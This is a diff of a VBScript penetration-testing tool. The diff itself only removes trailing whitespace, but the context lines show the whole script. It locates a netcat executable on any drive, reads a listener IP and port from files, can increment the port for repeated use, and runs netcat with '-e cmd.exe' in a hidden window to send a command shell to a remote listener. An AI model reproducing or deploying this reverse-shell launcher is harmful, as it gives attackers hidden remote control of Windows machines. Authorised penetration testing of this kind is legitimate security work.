@@ -16,7 +16,7 @@ Option Explicit
 ' listeners while doing a PenTest, and grab multiple reverse
 ' shells in one trip.  Uncomment that if you want the auto-increment
 '
-' Note: You must put the netcat executable in the switch directory with this 
+' Note: You must put the netcat executable in the switch directory with this
 '       script in order for it to work
 '==============================================================================
 
@@ -43,7 +43,7 @@ Set objFSO = CreateObject("Scripting.FileSystemObject")
 
 ' Set default value
 strCurrentDirectory = ""
-    
+
 ' The folder location
 FindCurrentDirectory
 
@@ -68,7 +68,7 @@ StartNetCat
 '==============================================================================
 sub FindCurrentDirectory
     Dim objDrives, d
-           
+
     ' Search all drives for the netcat exe
     Set objDrives = objFSO.Drives
     For Each d in objDrives
@@ -86,17 +86,17 @@ End Sub
 '       Name: ReadHostIP
 '  Arguments: None
 ' Return Value: None
-' Description: Read the listener IP                                         
+' Description: Read the listener IP
 '==============================================================================
 Sub ReadHostIP()
     ' Opens the file for reading
     Set objFile = objFSO.OpenTextFile(strCurrentDirectory + strListenerIPFile , ForReading)
-    
+
     ' Read the host IP
     strListenerIP = objFile.ReadAll
-    
+
     ' Close the file
-    objFile.Close    
+    objFile.Close
 End Sub
 
 
@@ -104,15 +104,15 @@ End Sub
 '       Name: ReadPort
 '  Arguments: None
 ' Return Value: None
-' Description: Read the listener port                                          
+' Description: Read the listener port
 '==============================================================================
 Sub ReadPort()
     ' Opens the file for reading
     Set objFile = objFSO.OpenTextFile(strCurrentDirectory + strListnerPortFile , ForReading)
-    
+
     ' Read the listener port
     strListenerPort = objFile.ReadAll
-    
+
     ' Close the file
     objFile.Close
 End Sub
@@ -121,19 +121,19 @@ End Sub
 '       Name: IncrementPort
 '  Arguments: None
 ' Return Value: None
-' Description: Read the listener port, increment the counter by 1, and write   
-'             the new value                                                   
+' Description: Read the listener port, increment the counter by 1, and write
+'             the new value
 '==============================================================================
-Sub IncrementPort()    
+Sub IncrementPort()
     ' Increment the listener port
     strNewListenerPort = strListenerPort + 1
-    	
+
     ' Open the file that contains the listener port for writing
     Set objFile = objFSO.OpenTextFile(strCurrentDirectory + strListnerPortFile , ForWriting)
-    
+
     ' Write the new (incremented) port
     objFile.WriteLine strNewListenerPort
-    
+
     ' Close the file
     objFile.Close
 End Sub
@@ -146,20 +146,20 @@ End Sub
 '==============================================================================
 Sub StartNetCat()
     Dim strNetCat, strCommand, objShell
-    
-    ' Build the path to the netcat executable    
+
+    ' Build the path to the netcat executable
     strNetCat = objFSO.BuildPath(strCurrentDirectory, strNetCatEXE)
-    
-    ' Create the command string to run netcat on the correct ip and port, 
+
+    ' Create the command string to run netcat on the correct ip and port,
     ' and serve cmd.exe to the listener
     strCommand = strNetCat + " -nv " + strListenerIP + " " + strListenerPort + " -e cmd.exe"
-      
-    ' Create the WScript Shell object       
+
+    ' Create the WScript Shell object
     Set objShell = WScript.CreateObject ("WScript.Shell")
-    
+
     ' Run the command (' , 0'= hidden)
     objShell.run strCommand, 0
-    
+
     ' Free the object from memory
     Set objShell = Nothing
 End Sub
